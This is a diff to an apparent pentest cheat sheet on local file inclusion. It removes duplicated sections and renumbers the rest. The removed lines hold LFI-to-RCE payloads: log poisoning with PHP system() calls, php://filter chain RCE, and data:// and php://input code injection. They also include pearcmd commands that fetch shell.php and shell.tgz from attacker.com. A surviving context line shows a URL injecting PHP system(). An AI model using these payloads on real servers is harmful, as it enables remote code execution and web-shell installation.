@@ -282,99 +282,7 @@ LFI (PHP code inclusion)
 
 ---
 
-## 11. LFI TO RCE ESCALATION PATHS
-
-| Method | Requirements | Payload |
-|---|---|---|
-| Log Poisoning (Apache) | LFI + Apache access.log readable | Inject `<?php system($_GET['c']);?>` in User-Agent → include `/var/log/apache2/access.log` |
-| Log Poisoning (SSH) | LFI + SSH auth.log readable | SSH as `<?php system('id');?>@target` → include `/var/log/auth.log` |
-| Log Poisoning (Mail) | LFI + mail log readable | Send email with PHP in subject → include `/var/log/mail.log` |
-| /proc/self/fd bruteforce | LFI + Linux | Bruteforce `/proc/self/fd/0` through `/proc/self/fd/255` for open file handles containing injected content |
-| /proc/self/environ | LFI + CGI/FastCGI | Inject PHP in `User-Agent` header → include `/proc/self/environ` |
-| iconv CVE-2024-2961 | glibc < 2.39, PHP with `php://filter` | `php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=` chain to heap overflow → RCE. Tool: cnext-exploits |
-| phpinfo() assisted | LFI + phpinfo page accessible | Race condition: upload tmp file via multipart to phpinfo → read tmp path from response → include before cleanup |
-| PHP Session | LFI + session file writable | Inject PHP into session via controllable session variable → include `/tmp/sess_SESSIONID` or `/var/lib/php/sessions/sess_SESSIONID` |
-| Upload race | LFI + upload endpoint | Upload PHP file → include before server-side validation/deletion |
-
----
-
-## 12. PHP WRAPPER EXPLOITATION MATRIX
-
-### php://filter (most powerful, always try first)
-
-```text
-php://filter/convert.base64-encode/resource=index.php
-php://filter/read=string.rot13/resource=index.php
-php://filter/convert.iconv.utf-8.utf-16/resource=index.php
-php://filter/zlib.deflate/resource=index.php
-```
-
-**Filter chain RCE** (synacktiv php_filter_chain_generator):
-
-- Chain multiple `convert.iconv` filters to write arbitrary bytes without file upload
-- Tool: `synacktiv/php_filter_chain_generator` → generates chain that writes PHP code
-- `python3 php_filter_chain_generator.py --chain '<?php system("id");?>'`
-
-**convert.iconv + dechunk oracle** (blind file read):
-
-- Tool: `synacktiv/php_filter_chains_oracle_exploit` (filters_chain_oracle_exploit)
-- Enables blind LFI to read file contents character by character
-
-### php://input
-
-```text
-POST vulnerable.php?page=php://input
-Body: <?php system('id'); ?>
-```
-
-Requires `allow_url_include=On`
-
-### data://
-
-```text
-data://text/plain,<?php system('id');?>
-data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
-data:text/plain,<?php system('id');?>    ← note: no double slash variant also works
-```
-
-### phar://
-
-```text
-phar://uploaded.phar/test.php
-```
-
-Triggers deserialization of phar metadata → RCE via POP chain (requires file upload of crafted phar, can be disguised as JPEG)
-
-### zip://
-
-```text
-zip://uploaded.zip%23shell.php
-```
-
-### expect://
-
-```text
-expect://id
-```
-
-Requires `expect` extension (rare)
-
----
-
-## 13. PEARCMD LFI EXPLOITATION
-
-When `pearcmd.php` is accessible via LFI (common in Docker PHP images):
-
-| Method | Payload |
-|---|---|
-| config-create | `/?file=pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/shell.php` |
-| man_dir | `/?file=pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?=phpinfo()?>+-s+` |
-| download | `/?file=pearcmd.php&+download+http://attacker.com/shell.php` |
-| install | `/?file=pearcmd.php&+install+http://attacker.com/shell.tgz` |
-
----
-
-## 14. WINDOWS-SPECIFIC LFI TECHNIQUES
+## 11. WINDOWS-SPECIFIC LFI TECHNIQUES
 
 **FindFirstFile wildcard** (Windows only):
 
@@ -384,27 +292,7 @@ When `pearcmd.php` is accessible via LFI (common in Docker PHP images):
 
 ---
 
-## 15. PARAMETER NAMING PATTERNS (HIGH-FREQUENCY TARGETS)
-
-Based on vulnerability research statistical analysis:
-
-| Parameter Name | Frequency | Context |
-|---|---|---|
-| `filename`, `file`, `path` | Very High | Direct file operations |
-| `page`, `include`, `template` | High | Template/page inclusion |
-| `url`, `src`, `href` | High | Resource loading |
-| `download`, `read`, `load` | Medium | File download/read |
-| `dir`, `folder`, `root` | Medium | Directory operations |
-| `hdfile`, `inputFile`, `XFileName` | Low | CMS/middleware specific |
-| `FileUrl`, `filePath`, `docPath` | Low | Enterprise app specific |
-
-High-frequency vulnerable endpoints:
-
-`down.php`, `download.jsp`, `download.asp`, `readfile.php`, `file_download.php`, `getfile.php`, `view.php`
-
----
-
-## 16. LFI TO RCE — ESCALATION PATHS
+## 12. LFI TO RCE — ESCALATION PATHS
 
 ### 1. /proc/self/fd Brute-Force
 ```
@@ -466,7 +354,7 @@ GET /page.php?lang=<?php system($_GET['c']); ?>
 
 ---
 
-## 17. PHP WRAPPER EXPLOITATION MATRIX
+## 13. PHP WRAPPER EXPLOITATION MATRIX
 
 ### php://filter (file read without execution)
 ```
@@ -542,7 +430,7 @@ phar:///tmp/upload.phar/anything
 
 ---
 
-## 18. PEARCMD LFI TO RCE
+## 14. PEARCMD LFI TO RCE
 
 When PEAR is installed and `register_argc_argv=On` (common in Docker PHP images):
 
@@ -571,7 +459,7 @@ include("shel>");      # Matches shell.php if only 1 char follows
 
 ---
 
-## 19. PARAMETER NAMING PATTERNS & HIGH-FREQUENCY ENDPOINTS
+## 15. PARAMETER NAMING PATTERNS & HIGH-FREQUENCY ENDPOINTS
 
 ### Common Vulnerable Parameter Names
 ```
@@ -601,3 +489,5 @@ inputFile   hdfile      XFileName   FileUrl     readfile
 | Double URL encoding | Moderate |
 | UTF-8 overlong encoding (`%c0%ae`) | Rare but effective |
 | Null byte truncation (`%00`) | Legacy (PHP < 5.3.4) |
+
+
